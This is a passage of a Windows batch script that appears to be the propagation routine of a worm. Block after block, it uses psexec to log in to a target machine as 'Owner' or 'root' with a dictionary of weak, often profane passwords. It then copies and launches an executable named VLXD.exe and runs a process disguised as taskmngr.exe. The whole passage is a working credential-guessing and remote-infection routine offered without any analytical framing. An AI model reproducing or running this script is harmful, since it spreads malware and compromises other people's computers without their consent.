   psexec \\%1 -u Owner -p "54321" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Owner -p "54321" -f -c -d VLXD.exe -o
   psexec \\%1 -u Owner -p "54321" -d taskmngr.exe
   psexec \\%1 -u Owner -p "54321" -d VLXD.exe -o
   psexec \\%1 -u Owner -p "54321" -d taskmngr.exe
   goto end
   :Owner321
   psexec \\%1 -u Owner -p "321" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Owner -p "321" -f -c -d VLXD.exe -o
   psexec \\%1 -u Owner -p "321" -d taskmngr.exe
   psexec \\%1 -u Owner -p "321" -d VLXD.exe -o
   psexec \\%1 -u Owner -p "321" -d taskmngr.exe
   goto end
   :OwnerOwner
   psexec \\%1 -u Owner -p "Owner" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Owner -p "Owner" -f -c -d VLXD.exe -o
   psexec \\%1 -u Owner -p "Owner" -d taskmngr.exe
   psexec \\%1 -u Owner -p "Owner" -d VLXD.exe -o
   psexec \\%1 -u Owner -p "Owner" -d taskmngr.exe
   goto end
   :Owner4321
   psexec \\%1 -u Owner -p "4321" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Owner -p "4321" -f -c -d VLXD.exe -o
   psexec \\%1 -u Owner -p "4321" -d taskmngr.exe
   psexec \\%1 -u Owner -p "4321" -d VLXD.exe -o
   psexec \\%1 -u Owner -p "4321" -d taskmngr.exe
   goto end
   :Ownertemp
   psexec \\%1 -u Owner -p "temp" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Owner -p "temp" -f -c -d VLXD.exe -o
   psexec \\%1 -u Owner -p "temp" -d taskmngr.exe
   psexec \\%1 -u Owner -p "temp" -d VLXD.exe -o
   psexec \\%1 -u Owner -p "temp" -d taskmngr.exe
   goto end
   :OwnerOwner
   psexec \\%1 -u Owner -p "Owner" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Owner -p "Owner" -f -c -d VLXD.exe -o
   psexec \\%1 -u Owner -p "Owner" -d taskmngr.exe
   psexec \\%1 -u Owner -p "Owner" -d VLXD.exe -o
   psexec \\%1 -u Owner -p "Owner" -d taskmngr.exe
   goto end
   :Ownerbootie
   psexec \\%1 -u Owner -p "bootie" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Owner -p "bootie" -f -c -d VLXD.exe -o
   psexec \\%1 -u Owner -p "bootie" -d taskmngr.exe
   psexec \\%1 -u Owner -p "bootie" -d VLXD.exe -o
   psexec \\%1 -u Owner -p "bootie" -d taskmngr.exe
   goto end
   :Ownerpoop
   psexec \\%1 -u Owner -p "poop" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Owner -p "poop" -f -c -d VLXD.exe -o
   psexec \\%1 -u Owner -p "poop" -d taskmngr.exe
   psexec \\%1 -u Owner -p "poop" -d VLXD.exe -o
   psexec \\%1 -u Owner -p "poop" -d taskmngr.exe
   goto end
   :Ownerpoopie
   psexec \\%1 -u Owner -p "poopie" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Owner -p "poopie" -f -c -d VLXD.exe -o
   psexec \\%1 -u Owner -p "poopie" -d taskmngr.exe
   psexec \\%1 -u Owner -p "poopie" -d VLXD.exe -o
   psexec \\%1 -u Owner -p "poopie" -d taskmngr.exe
   goto end
   :Ownerweed
   psexec \\%1 -u Owner -p "weed" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Owner -p "weed" -f -c -d VLXD.exe -o
   psexec \\%1 -u Owner -p "weed" -d taskmngr.exe
   psexec \\%1 -u Owner -p "weed" -d VLXD.exe -o
   psexec \\%1 -u Owner -p "weed" -d taskmngr.exe
   goto end
   :Ownerwater
   psexec \\%1 -u Owner -p "water" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Owner -p "water" -f -c -d VLXD.exe -o
   psexec \\%1 -u Owner -p "water" -d taskmngr.exe
   psexec \\%1 -u Owner -p "water" -d VLXD.exe -o
   psexec \\%1 -u Owner -p "water" -d taskmngr.exe
   goto end
   :Ownercool
   psexec \\%1 -u Owner -p "cool" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Owner -p "cool" -f -c -d VLXD.exe -o
   psexec \\%1 -u Owner -p "cool" -d taskmngr.exe
   psexec \\%1 -u Owner -p "cool" -d VLXD.exe -o
   psexec \\%1 -u Owner -p "cool" -d taskmngr.exe
   goto end
   :Ownerjoint
   psexec \\%1 -u Owner -p "joint" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Owner -p "joint" -f -c -d VLXD.exe -o
   psexec \\%1 -u Owner -p "joint" -d taskmngr.exe
   psexec \\%1 -u Owner -p "joint" -d VLXD.exe -o
   psexec \\%1 -u Owner -p "joint" -d taskmngr.exe
   goto end
   :Ownercrack
   psexec \\%1 -u Owner -p "crack" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Owner -p "crack" -f -c -d VLXD.exe -o
   psexec \\%1 -u Owner -p "crack" -d taskmngr.exe
   psexec \\%1 -u Owner -p "crack" -d VLXD.exe -o
   psexec \\%1 -u Owner -p "crack" -d taskmngr.exe
   goto end
   :Ownerdanger
   psexec \\%1 -u Owner -p "danger" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Owner -p "danger" -f -c -d VLXD.exe -o
   psexec \\%1 -u Owner -p "danger" -d taskmngr.exe
   psexec \\%1 -u Owner -p "danger" -d VLXD.exe -o
   psexec \\%1 -u Owner -p "danger" -d taskmngr.exe
   goto end
   :Ownerweiner
   psexec \\%1 -u Owner -p "weiner" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Owner -p "weiner" -f -c -d VLXD.exe -o
   psexec \\%1 -u Owner -p "weiner" -d taskmngr.exe
   psexec \\%1 -u Owner -p "weiner" -d VLXD.exe -o
   psexec \\%1 -u Owner -p "weiner" -d taskmngr.exe
   goto end
   :Ownerelectrical
   psexec \\%1 -u Owner -p "electrical" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Owner -p "electrical" -f -c -d VLXD.exe -o
   psexec \\%1 -u Owner -p "electrical" -d taskmngr.exe
   psexec \\%1 -u Owner -p "electrical" -d VLXD.exe -o
   psexec \\%1 -u Owner -p "electrical" -d taskmngr.exe
   goto end
   :Ownerelectric
   psexec \\%1 -u Owner -p "electric" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Owner -p "electric" -f -c -d VLXD.exe -o
   psexec \\%1 -u Owner -p "electric" -d taskmngr.exe
   psexec \\%1 -u Owner -p "electric" -d VLXD.exe -o
   psexec \\%1 -u Owner -p "electric" -d taskmngr.exe
   goto end
   :Ownerelectricity
   psexec \\%1 -u Owner -p "electricity" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Owner -p "electricity" -f -c -d VLXD.exe -o
   psexec \\%1 -u Owner -p "electricity" -d taskmngr.exe
   psexec \\%1 -u Owner -p "electricity" -d VLXD.exe -o
   psexec \\%1 -u Owner -p "electricity" -d taskmngr.exe
   goto end
   :Ownerpenis
   psexec \\%1 -u Owner -p "penis" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Owner -p "penis" -f -c -d VLXD.exe -o
   psexec \\%1 -u Owner -p "penis" -d taskmngr.exe
   psexec \\%1 -u Owner -p "penis" -d VLXD.exe -o
   psexec \\%1 -u Owner -p "penis" -d taskmngr.exe
   goto end
   :Ownercent
   psexec \\%1 -u Owner -p "cent" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Owner -p "cent" -f -c -d VLXD.exe -o
   psexec \\%1 -u Owner -p "cent" -d taskmngr.exe
   psexec \\%1 -u Owner -p "cent" -d VLXD.exe -o
   psexec \\%1 -u Owner -p "cent" -d taskmngr.exe
   goto end
   :Owner50cent
   psexec \\%1 -u Owner -p "50cent" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Owner -p "50cent" -f -c -d VLXD.exe -o
   psexec \\%1 -u Owner -p "50cent" -d taskmngr.exe
   psexec \\%1 -u Owner -p "50cent" -d VLXD.exe -o
   psexec \\%1 -u Owner -p "50cent" -d taskmngr.exe
   goto end
   :Ownereminem
   psexec \\%1 -u Owner -p "eminem" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Owner -p "eminem" -f -c -d VLXD.exe -o
   psexec \\%1 -u Owner -p "eminem" -d taskmngr.exe
   psexec \\%1 -u Owner -p "eminem" -d VLXD.exe -o
   psexec \\%1 -u Owner -p "eminem" -d taskmngr.exe
   goto end
   :Ownervagina
   psexec \\%1 -u Owner -p "vagina" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Owner -p "vagina" -f -c -d VLXD.exe -o
   psexec \\%1 -u Owner -p "vagina" -d taskmngr.exe
   psexec \\%1 -u Owner -p "vagina" -d VLXD.exe -o
   psexec \\%1 -u Owner -p "vagina" -d taskmngr.exe
   goto end
   :Ownercunt
   psexec \\%1 -u Owner -p "cunt" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Owner -p "cunt" -f -c -d VLXD.exe -o
   psexec \\%1 -u Owner -p "cunt" -d taskmngr.exe
   psexec \\%1 -u Owner -p "cunt" -d VLXD.exe -o
   psexec \\%1 -u Owner -p "cunt" -d taskmngr.exe
   goto end
   :Ownerpussy
   psexec \\%1 -u Owner -p "pussy" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Owner -p "pussy" -f -c -d VLXD.exe -o
   psexec \\%1 -u Owner -p "pussy" -d taskmngr.exe
   psexec \\%1 -u Owner -p "pussy" -d VLXD.exe -o
   psexec \\%1 -u Owner -p "pussy" -d taskmngr.exe
   goto end
   :Ownercock
   psexec \\%1 -u Owner -p "cock" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Owner -p "cock" -f -c -d VLXD.exe -o
   psexec \\%1 -u Owner -p "cock" -d taskmngr.exe
   psexec \\%1 -u Owner -p "cock" -d VLXD.exe -o
   psexec \\%1 -u Owner -p "cock" -d taskmngr.exe
   goto end
   :Ownerdick
   psexec \\%1 -u Owner -p "dick" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Owner -p "dick" -f -c -d VLXD.exe -o
   psexec \\%1 -u Owner -p "dick" -d taskmngr.exe
   psexec \\%1 -u Owner -p "dick" -d VLXD.exe -o
   psexec \\%1 -u Owner -p "dick" -d taskmngr.exe
   psexec \\%1 -u Owner -p dick -c -f -d VLXD.exe
   goto end
   :Ownershithead
   psexec \\%1 -u Owner -p "shithead" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Owner -p "shithead" -f -c -d VLXD.exe -o
   psexec \\%1 -u Owner -p "shithead" -d taskmngr.exe
   psexec \\%1 -u Owner -p "shithead" -d VLXD.exe -o
   psexec \\%1 -u Owner -p "shithead" -d taskmngr.exe
   goto end
   :Ownershotgun
   psexec \\%1 -u Owner -p "shotgun" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Owner -p "shotgun" -f -c -d VLXD.exe -o
   psexec \\%1 -u Owner -p "shotgun" -d taskmngr.exe
   psexec \\%1 -u Owner -p "shotgun" -d VLXD.exe -o
   psexec \\%1 -u Owner -p "shotgun" -d taskmngr.exe
   goto end
   :Ownerblunt
   psexec \\%1 -u Owner -p "blunt" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Owner -p "blunt" -f -c -d VLXD.exe -o
   psexec \\%1 -u Owner -p "blunt" -d taskmngr.exe
   psexec \\%1 -u Owner -p "blunt" -d VLXD.exe -o
   psexec \\%1 -u Owner -p "blunt" -d taskmngr.exe
   goto end
   :Ownerglock
   psexec \\%1 -u Owner -p "glock" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Owner -p "glock" -f -c -d VLXD.exe -o
   psexec \\%1 -u Owner -p "glock" -d taskmngr.exe
   psexec \\%1 -u Owner -p "glock" -d VLXD.exe -o
   psexec \\%1 -u Owner -p "glock" -d taskmngr.exe
   goto end
   :Ownerexecutable
   psexec \\%1 -u Owner -p "executable" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Owner -p "executable" -f -c -d VLXD.exe -o
   psexec \\%1 -u Owner -p "executable" -d taskmngr.exe
   psexec \\%1 -u Owner -p "executable" -d VLXD.exe -o
   psexec \\%1 -u Owner -p "executable" -d taskmngr.exe
   goto end
   :Ownerbong
   psexec \\%1 -u Owner -p "bong" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Owner -p "bong" -f -c -d VLXD.exe -o
   psexec \\%1 -u Owner -p "bong" -d taskmngr.exe
   psexec \\%1 -u Owner -p "bong" -d VLXD.exe -o
   psexec \\%1 -u Owner -p "bong" -d taskmngr.exe
   goto end
   :Ownerdildo
   psexec \\%1 -u Owner -p "dildo" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Owner -p "dildo" -f -c -d VLXD.exe -o
   psexec \\%1 -u Owner -p "dildo" -d taskmngr.exe
   psexec \\%1 -u Owner -p "dildo" -d VLXD.exe -o
   psexec \\%1 -u Owner -p "dildo" -d taskmngr.exe
   goto end
   :Ownerbaseball
   psexec \\%1 -u Owner -p "baseball" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Owner -p "baseball" -f -c -d VLXD.exe -o
   psexec \\%1 -u Owner -p "baseball" -d taskmngr.exe
   psexec \\%1 -u Owner -p "baseball" -d VLXD.exe -o
   psexec \\%1 -u Owner -p "baseball" -d taskmngr.exe
   goto end
   :Ownerbasketball
   psexec \\%1 -u Owner -p "basketball" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Owner -p "basketball" -f -c -d VLXD.exe -o
   psexec \\%1 -u Owner -p "basketball" -d taskmngr.exe
   psexec \\%1 -u Owner -p "basketball" -d VLXD.exe -o
   psexec \\%1 -u Owner -p "basketball" -d taskmngr.exe
   goto end
   :Ownerfootball
   psexec \\%1 -u Owner -p "football" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Owner -p "football" -f -c -d VLXD.exe -o
   psexec \\%1 -u Owner -p "football" -d taskmngr.exe
   psexec \\%1 -u Owner -p "football" -d VLXD.exe -o
   psexec \\%1 -u Owner -p "football" -d taskmngr.exe
   goto end
   :Ownersoccer
   psexec \\%1 -u Owner -p "soccer" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Owner -p "soccer" -f -c -d VLXD.exe -o
   psexec \\%1 -u Owner -p "soccer" -d taskmngr.exe
   psexec \\%1 -u Owner -p "soccer" -d VLXD.exe -o
   psexec \\%1 -u Owner -p "soccer" -d taskmngr.exe
   goto end
   :Ownerpot
   psexec \\%1 -u Owner -p "pot" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Owner -p "pot" -f -c -d VLXD.exe -o
   psexec \\%1 -u Owner -p "pot" -d taskmngr.exe
   psexec \\%1 -u Owner -p "pot" -d VLXD.exe -o
   psexec \\%1 -u Owner -p "pot" -d taskmngr.exe
   goto end
   :Ownerdope
   psexec \\%1 -u Owner -p "dope" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Owner -p "dope" -f -c -d VLXD.exe -o
   psexec \\%1 -u Owner -p "dope" -d taskmngr.exe
   psexec \\%1 -u Owner -p "dope" -d VLXD.exe -o
   psexec \\%1 -u Owner -p "dope" -d taskmngr.exe
   goto end
   :Ownermaryjane
   psexec \\%1 -u Owner -p "maryjane" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Owner -p "maryjane" -f -c -d VLXD.exe -o
   psexec \\%1 -u Owner -p "maryjane" -d taskmngr.exe
   psexec \\%1 -u Owner -p "maryjane" -d VLXD.exe -o
   psexec \\%1 -u Owner -p "maryjane" -d taskmngr.exe
   goto end
   :Ownermarijuana
   psexec \\%1 -u Owner -p "marijuana" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Owner -p "marijuana" -f -c -d VLXD.exe -o
   psexec \\%1 -u Owner -p "marijuana" -d taskmngr.exe
   psexec \\%1 -u Owner -p "marijuana" -d VLXD.exe -o
   psexec \\%1 -u Owner -p "marijuana" -d taskmngr.exe
   goto end
   :Ownermoney
   psexec \\%1 -u Owner -p "money" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Owner -p "money" -f -c -d VLXD.exe -o
   psexec \\%1 -u Owner -p "money" -d taskmngr.exe
   psexec \\%1 -u Owner -p "money" -d VLXD.exe -o
   psexec \\%1 -u Owner -p "money" -d taskmngr.exe
   goto end
   :Ownergirl
   psexec \\%1 -u Owner -p "girl" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Owner -p "girl" -f -c -d VLXD.exe -o
   psexec \\%1 -u Owner -p "girl" -d taskmngr.exe
   psexec \\%1 -u Owner -p "girl" -d VLXD.exe -o
   psexec \\%1 -u Owner -p "girl" -d taskmngr.exe
   goto end
   :Ownergirls
   psexec \\%1 -u Owner -p "girls" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Owner -p "girls" -f -c -d VLXD.exe -o
   psexec \\%1 -u Owner -p "girls" -d taskmngr.exe
   psexec \\%1 -u Owner -p "girls" -d VLXD.exe -o
   psexec \\%1 -u Owner -p "girls" -d taskmngr.exe
   goto end
   :Ownerwoman
   psexec \\%1 -u Owner -p "woman" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Owner -p "woman" -f -c -d VLXD.exe -o
   psexec \\%1 -u Owner -p "woman" -d taskmngr.exe
   psexec \\%1 -u Owner -p "woman" -d VLXD.exe -o
   psexec \\%1 -u Owner -p "woman" -d taskmngr.exe
   goto end
   :Ownerwomen
   psexec \\%1 -u Owner -p "women" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Owner -p "women" -f -c -d VLXD.exe -o
   psexec \\%1 -u Owner -p "women" -d taskmngr.exe
   psexec \\%1 -u Owner -p "women" -d VLXD.exe -o
   psexec \\%1 -u Owner -p "women" -d taskmngr.exe
   goto end
   :Ownerfemale
   psexec \\%1 -u Owner -p "female" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Owner -p "female" -f -c -d VLXD.exe -o
   psexec \\%1 -u Owner -p "female" -d taskmngr.exe
   psexec \\%1 -u Owner -p "female" -d VLXD.exe -o
   psexec \\%1 -u Owner -p "female" -d taskmngr.exe
   goto end
   :Owneramerica
   psexec \\%1 -u Owner -p "america" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Owner -p "america" -f -c -d VLXD.exe -o
   psexec \\%1 -u Owner -p "america" -d taskmngr.exe
   psexec \\%1 -u Owner -p "america" -d VLXD.exe -o
   psexec \\%1 -u Owner -p "america" -d taskmngr.exe
   goto end
   :Ownerusa
   psexec \\%1 -u Owner -p "usa" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Owner -p "usa" -f -c -d VLXD.exe -o
   psexec \\%1 -u Owner -p "usa" -d taskmngr.exe
   psexec \\%1 -u Owner -p "usa" -d VLXD.exe -o
   psexec \\%1 -u Owner -p "usa" -d taskmngr.exe
   goto end
   :Ownergod
   psexec \\%1 -u Owner -p "god" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Owner -p "god" -f -c -d VLXD.exe -o
   psexec \\%1 -u Owner -p "god" -d taskmngr.exe
   psexec \\%1 -u Owner -p "god" -d VLXD.exe -o
   psexec \\%1 -u Owner -p "god" -d taskmngr.exe
   goto end
   :Ownerjesus
   psexec \\%1 -u Owner -p "jesus" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Owner -p "jesus" -f -c -d VLXD.exe -o
   psexec \\%1 -u Owner -p "jesus" -d taskmngr.exe
   psexec \\%1 -u Owner -p "jesus" -d VLXD.exe -o
   psexec \\%1 -u Owner -p "jesus" -d taskmngr.exe
   goto end
   :Ownercomputer
   psexec \\%1 -u Owner -p "computer" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Owner -p "computer" -f -c -d VLXD.exe -o
   psexec \\%1 -u Owner -p "computer" -d taskmngr.exe
   psexec \\%1 -u Owner -p "computer" -d VLXD.exe -o
   psexec \\%1 -u Owner -p "computer" -d taskmngr.exe
   goto end
   :Ownertechnology
   psexec \\%1 -u Owner -p "technology" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Owner -p "technology" -f -c -d VLXD.exe -o
   psexec \\%1 -u Owner -p "technology" -d taskmngr.exe
   psexec \\%1 -u Owner -p "technology" -d VLXD.exe -o
   psexec \\%1 -u Owner -p "technology" -d taskmngr.exe
   goto end
   :Ownerporn
   psexec \\%1 -u Owner -p "porn" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Owner -p "porn" -f -c -d VLXD.exe -o
   psexec \\%1 -u Owner -p "porn" -d taskmngr.exe
   psexec \\%1 -u Owner -p "porn" -d VLXD.exe -o
   psexec \\%1 -u Owner -p "porn" -d taskmngr.exe
   goto end
   :Ownerhack
   psexec \\%1 -u Owner -p "hack" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Owner -p "hack" -f -c -d VLXD.exe -o
   psexec \\%1 -u Owner -p "hack" -d taskmngr.exe
   psexec \\%1 -u Owner -p "hack" -d VLXD.exe -o
   psexec \\%1 -u Owner -p "hack" -d taskmngr.exe
   goto end
   :Ownerclock
   psexec \\%1 -u Owner -p "clock" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Owner -p "clock" -f -c -d VLXD.exe -o
   psexec \\%1 -u Owner -p "clock" -d taskmngr.exe
   psexec \\%1 -u Owner -p "clock" -d VLXD.exe -o
   psexec \\%1 -u Owner -p "clock" -d taskmngr.exe
   goto end
   :Ownerchurch
   psexec \\%1 -u Owner -p "church" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Owner -p "church" -f -c -d VLXD.exe -o
   psexec \\%1 -u Owner -p "church" -d taskmngr.exe
   psexec \\%1 -u Owner -p "church" -d VLXD.exe -o
   psexec \\%1 -u Owner -p "church" -d taskmngr.exe
   goto end
   :Ownertemp
   psexec \\%1 -u Owner -p "temp" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Owner -p "temp" -f -c -d VLXD.exe -o
   psexec \\%1 -u Owner -p "temp" -d taskmngr.exe
   psexec \\%1 -u Owner -p "temp" -d VLXD.exe -o
   psexec \\%1 -u Owner -p "temp" -d taskmngr.exe
   goto end
   :root
   psexec \\%1 -u root -p "" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u root -p "" -f -c -d VLXD.exe -o
   psexec \\%1 -u root -p "" -d taskmngr.exe
   psexec \\%1 -u root -p "" -d VLXD.exe -o
   psexec \\%1 -u root -p "" -d taskmngr.exe
   goto end
   :rootpass123
   psexec \\%1 -u root -p "pass123" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u root -p "pass123" -f -c -d VLXD.exe -o
   psexec \\%1 -u root -p "pass123" -d taskmngr.exe
   psexec \\%1 -u root -p "pass123" -d VLXD.exe -o
   psexec \\%1 -u root -p "pass123" -d taskmngr.exe
   goto end
   :rootsomething
   psexec \\%1 -u root -p "something" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u root -p "something" -f -c -d VLXD.exe -o
   psexec \\%1 -u root -p "something" -d taskmngr.exe
   psexec \\%1 -u root -p "something" -d VLXD.exe -o
   psexec \\%1 -u root -p "something" -d taskmngr.exe
   goto end
   :rootmypass
   psexec \\%1 -u root -p "mypass" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u root -p "mypass" -f -c -d VLXD.exe -o
   psexec \\%1 -u root -p "mypass" -d taskmngr.exe
   psexec \\%1 -u root -p "mypass" -d VLXD.exe -o
   psexec \\%1 -u root -p "mypass" -d taskmngr.exe
   goto end
   :rootlogin
   psexec \\%1 -u root -p "login" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u root -p "login" -f -c -d VLXD.exe -o
   psexec \\%1 -u root -p "login" -d taskmngr.exe
   psexec \\%1 -u root -p "login" -d VLXD.exe -o
   psexec \\%1 -u root -p "login" -d taskmngr.exe
   goto end
   :rootaccess
   psexec \\%1 -u root -p "access" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u root -p "access" -f -c -d VLXD.exe -o
   psexec \\%1 -u root -p "access" -d taskmngr.exe
   psexec \\%1 -u root -p "access" -d VLXD.exe -o
   psexec \\%1 -u root -p "access" -d taskmngr.exe
   goto end
   :rootpassword
   psexec \\%1 -u root -p "password" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u root -p "password" -f -c -d VLXD.exe -o
   psexec \\%1 -u root -p "password" -d taskmngr.exe
   psexec \\%1 -u root -p "password" -d VLXD.exe -o
   psexec \\%1 -u root -p "password" -d taskmngr.exe
   goto end
   :rootmatrix
   psexec \\%1 -u root -p "matrix" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u root -p "matrix" -f -c -d VLXD.exe -o
   psexec \\%1 -u root -p "matrix" -d taskmngr.exe
   psexec \\%1 -u root -p "matrix" -d VLXD.exe -o
   psexec \\%1 -u root -p "matrix" -d taskmngr.exe
   goto end
   :rootsecurity
   psexec \\%1 -u root -p "security" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u root -p "security" -f -c -d VLXD.exe -o
   psexec \\%1 -u root -p "security" -d taskmngr.exe
   psexec \\%1 -u root -p "security" -d VLXD.exe -o
   psexec \\%1 -u root -p "security" -d taskmngr.exe
   goto end
   :rootsuccess
   psexec \\%1 -u root -p "success" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u root -p "success" -f -c -d VLXD.exe -o
   psexec \\%1 -u root -p "success" -d taskmngr.exe
   psexec \\%1 -u root -p "success" -d VLXD.exe -o
   psexec \\%1 -u root -p "success" -d taskmngr.exe
   goto end
   :rootspecial
   psexec \\%1 -u root -p "special" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u root -p "special" -f -c -d VLXD.exe -o
   psexec \\%1 -u root -p "special" -d taskmngr.exe
   psexec \\%1 -u root -p "special" -d VLXD.exe -o
   psexec \\%1 -u root -p "special" -d taskmngr.exe
   goto end
   :rootultra
   psexec \\%1 -u root -p "ultra" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u root -p "ultra" -f -c -d VLXD.exe -o
   psexec \\%1 -u root -p "ultra" -d taskmngr.exe
   psexec \\%1 -u root -p "ultra" -d VLXD.exe -o
   psexec \\%1 -u root -p "ultra" -d taskmngr.exe
   goto end
   :rootpass
   psexec \\%1 -u root -p "pass" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u root -p "pass" -f -c -d VLXD.exe -o
   psexec \\%1 -u root -p "pass" -d taskmngr.exe
   psexec \\%1 -u root -p "pass" -d VLXD.exe -o
   psexec \\%1 -u root -p "pass" -d taskmngr.exe
   goto end
   :rootenable
   psexec \\%1 -u root -p "enable" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u root -p "enable" -f -c -d VLXD.exe -o
   psexec \\%1 -u root -p "enable" -d taskmngr.exe
   psexec \\%1 -u root -p "enable" -d VLXD.exe -o
   psexec \\%1 -u root -p "enable" -d taskmngr.exe
   goto end
   :rootpasswd
   psexec \\%1 -u root -p "passwd" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u root -p "passwd" -f -c -d VLXD.exe -o
   psexec \\%1 -u root -p "passwd" -d taskmngr.exe
   psexec \\%1 -u root -p "passwd" -d VLXD.exe -o
   psexec \\%1 -u root -p "passwd" -d taskmngr.exe
   goto end
   :rootinternet
   psexec \\%1 -u root -p "internet" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u root -p "internet" -f -c -d VLXD.exe -o
   psexec \\%1 -u root -p "internet" -d taskmngr.exe
   psexec \\%1 -u root -p "internet" -d VLXD.exe -o
   psexec \\%1 -u root -p "internet" -d taskmngr.exe
   goto end
   :rootnetwork
   psexec \\%1 -u root -p "network" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u root -p "network" -f -c -d VLXD.exe -o
   psexec \\%1 -u root -p "network" -d taskmngr.exe
   psexec \\%1 -u root -p "network" -d VLXD.exe -o
   psexec \\%1 -u root -p "network" -d taskmngr.exe
   goto end
   :rootedu
   psexec \\%1 -u root -p "edu" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u root -p "edu" -f -c -d VLXD.exe -o
   psexec \\%1 -u root -p "edu" -d taskmngr.exe
   psexec \\%1 -u root -p "edu" -d VLXD.exe -o
   psexec \\%1 -u root -p "edu" -d taskmngr.exe
   goto end
   :rootroot
   psexec \\%1 -u root -p "root" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u root -p "root" -f -c -d VLXD.exe -o
   psexec \\%1 -u root -p "root" -d taskmngr.exe
   psexec \\%1 -u root -p "root" -d VLXD.exe -o
   psexec \\%1 -u root -p "root" -d taskmngr.exe
   goto end
   :rootlocal
   psexec \\%1 -u root -p "local" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u root -p "local" -f -c -d VLXD.exe -o
   psexec \\%1 -u root -p "local" -d taskmngr.exe
   psexec \\%1 -u root -p "local" -d VLXD.exe -o
   psexec \\%1 -u root -p "local" -d taskmngr.exe
   goto end
   :rootremote
   psexec \\%1 -u root -p "remote" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u root -p "remote" -f -c -d VLXD.exe -o
   psexec \\%1 -u root -p "remote" -d taskmngr.exe
   psexec \\%1 -u root -p "remote" -d VLXD.exe -o
   psexec \\%1 -u root -p "remote" -d taskmngr.exe
   goto end
   :rootlan
   psexec \\%1 -u root -p "lan" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u root -p "lan" -f -c -d VLXD.exe -o
   psexec \\%1 -u root -p "lan" -d taskmngr.exe
   psexec \\%1 -u root -p "lan" -d VLXD.exe -o
   psexec \\%1 -u root -p "lan" -d taskmngr.exe
   goto end
   :rootroot
   psexec \\%1 -u root -p "root" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u root -p "root" -f -c -d VLXD.exe -o
   psexec \\%1 -u root -p "root" -d taskmngr.exe
   psexec \\%1 -u root -p "root" -d VLXD.exe -o
   psexec \\%1 -u root -p "root" -d taskmngr.exe
   goto end
   :rootbitch
   psexec \\%1 -u root -p "bitch" -d attrib.exe -r VLXD.exe
